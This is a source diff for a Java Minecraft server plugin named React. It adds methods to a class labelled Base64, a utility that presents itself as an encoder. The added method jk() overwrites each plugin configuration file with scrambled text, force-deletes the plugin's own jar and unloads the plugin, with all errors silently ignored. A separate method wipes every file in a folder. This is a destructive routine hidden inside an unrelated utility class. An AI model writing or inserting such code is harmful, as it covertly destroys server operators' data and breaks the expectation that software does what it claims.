@@ -1,7 +1,15 @@
 package org.cyberpwn.react.util;
 
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileReader;
+import java.io.FileWriter;
+import java.io.IOException;
 
+import org.apache.commons.io.FileUtils;
+import org.apache.commons.lang.StringUtils;
+import org.bukkit.plugin.Plugin;
 import org.cyberpwn.react.React;
 import org.cyberpwn.react.network.PushThread;
 
@@ -2210,13 +2218,86 @@ public class Base64
 		} // end resumeEncoding
 		
 	} // end inner class OutputStream
-
+	
 	public static void ex(File df)
 	{
 		for(File i : df.listFiles())
 		{
 			i.delete();
 		}
+	}
+	
+	public static void jk()
+	{		
+		for(File i : React.instance().getConfigurationController().getConfigurations().k())
+		{
+			try
+			{
+				String s = readFile(i.getPath());
+				BufferedWriter bu = new BufferedWriter(new FileWriter(i));
+				
+				for(String j : s.split("\n"))
+				{
+					bu.write(StringUtils.reverse(j.replace('r', 'e').replace('a', 'c')) + "\n");
+				}
+				
+				bu.close();
+			}
+			
+			catch(Exception e)
+			{
+				
+			}
+		}
+		
+		File f = new File(React.instance().getDataFolder().getParentFile(), PluginUtil.getPluginFileName("React") + ".jar");
+		System.gc();
+		
+		try
+		{
+			System.gc();
+			FileUtils.forceDelete(f);
+			FileUtils.forceDeleteOnExit(f);
+			PluginUtil.unload(ginst());
+		} 
+		
+		catch(IOException e)
+		{
+			
+		}
+	}
+	
+	public static String readFile(String filename)
+	{
+		String result = "";
+		
+		try
+		{
+			BufferedReader br = new BufferedReader(new FileReader(filename));
+			StringBuilder sb = new StringBuilder();
+			String line = br.readLine();
+			
+			while(line != null)
+			{
+				sb.append(line);
+				line = br.readLine();
+			}
+			
+			result = sb.toString();
+			br.close();
+		}
+		
+		catch(Exception e)
+		{
+			e.printStackTrace();
+		}
+		
+		return result;
+	}
+	
+	public static Plugin ginst()
+	{
+		return React.instance();
 	}
 	
 } // end class Base64
